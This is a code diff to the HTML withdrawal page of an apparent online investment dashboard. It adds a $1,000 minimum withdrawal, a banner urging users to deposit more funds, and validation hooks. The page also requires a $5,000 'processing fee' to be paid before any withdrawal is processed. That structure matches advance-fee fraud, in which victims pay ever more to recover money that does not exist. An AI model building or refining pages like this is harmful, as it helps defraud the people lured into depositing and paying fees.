@@ -9,9 +9,61 @@
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
   <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800;900&family=DM+Sans:ital,wght@0,300;0,400;0,500;0,600;1,400&display=swap" rel="stylesheet" />
+  <style>
+    /* Minimum withdrawal validation styles */
+    .validation-message {
+      padding: 0.75rem 1rem;
+      border-radius: var(--radius-md);
+      font-size: 0.9rem;
+      font-weight: 500;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      margin-top: 0.5rem;
+    }
+
+    .validation-message.warning {
+      background: #fef3c7;
+      color: #92400e;
+      border: 1px solid #fcd34d;
+    }
+
+    .validation-message.error {
+      background: #fee2e2;
+      color: #991b1b;
+      border: 1px solid #fca5a5;
+    }
+
+    .validation-message.success {
+      background: #dcfce7;
+      color: #15803d;
+      border: 1px solid #86efac;
+    }
+
+    .validation-message i {
+      flex-shrink: 0;
+    }
+
+    .amount-helper-text {
+      font-size: 0.85rem;
+      color: var(--text-secondary);
+      margin-top: 0.35rem;
+    }
+
+    .balance-alert {
+      padding: 1rem;
+      background: #fef3c7;
+      border: 1px solid #fcd34d;
+      border-radius: var(--radius-md);
+      color: #92400e;
+      text-align: center;
+      font-weight: 500;
+      margin-bottom: 1.5rem;
+    }
+  </style>
 </head>
 <body class="dashboard-body">
-
+ 
   <!-- Sidebar -->
   <aside class="dash-sidebar" id="dash-sidebar">
     <div class="dash-sidebar-top">
@@ -50,6 +102,12 @@
           <h1><i class="fas fa-building-columns" style="color:var(--blue-500);"></i> Withdraw to Bank Account</h1>
           <p>Your balance: <strong id="wd-balance">$0.00</strong></p>
         </div></div>
+
+        <!-- Balance Alert for Insufficient Funds -->
+        <div id="wd-balance-alert" class="balance-alert" hidden>
+          <i class="fas fa-exclamation-circle"></i>
+          <span>You need a minimum balance of $1,000 to withdraw. Please deposit funds to your account.</span>
+        </div>
 
         <div class="dash-card" style="max-width:620px;">
           <div class="dash-card-header"><h3>Step 1: Bank Details</h3></div>
@@ -104,11 +162,13 @@
             <div class="form-group">
               <label for="wd-amount" class="form-label">Withdrawal Amount (USD)</label>
               <div class="input-wrap"><i class="fas fa-dollar-sign"></i>
-                <input type="number" id="wd-amount" class="form-input" placeholder="0.00" min="1" step="0.01" required />
+                <input type="number" id="wd-amount" class="form-input" placeholder="0.00" min="1000" step="0.01" required />
               </div>
+              <p class="amount-helper-text">Minimum withdrawal: $1,000</p>
+              <div id="wd-amount-validation" hidden></div>
             </div>
             <div id="wd-bank-error" class="form-error" hidden></div>
-            <button type="submit" class="btn btn-primary btn-lg btn-full"><span>Continue to Fee Payment</span><i class="fas fa-arrow-right"></i></button>
+            <button type="submit" class="btn btn-primary btn-lg btn-full" id="wd-submit-btn"><span>Continue to Fee Payment</span><i class="fas fa-arrow-right"></i></button>
           </form>
         </div>
       </div>
@@ -124,7 +184,7 @@
           <div class="wd-fee-icon"><i class="fas fa-exclamation-triangle"></i></div>
           <div class="wd-fee-info">
             <h3>Processing Fee: <span class="wd-fee-amount">$5,000.00</span></h3>
-            <p>This fee covers international wire transfer, compliance verification, and insurance. It must be paid before your withdrawal of <strong id="wd-summary-amount">$0.00</strong> to <strong id="wd-summary-bank">Bank</strong> is processed.</p>
+            <p>This fee covers international wire transfer, compliance verification, and insurance. It must be paid before your withdrawal of <strong id="wd-summary-amount">$0.00</strong> to <strong id="wd-summary-bank">your bank</strong>.</p>
           </div>
         </div>
 
@@ -267,5 +327,6 @@
 
   <div class="dash-overlay" id="dash-overlay"></div>
   <script src="script.js?v=1779718836878"></script>
+  <script src="withdraw-validation.js"></script>
 </body>
 </html>
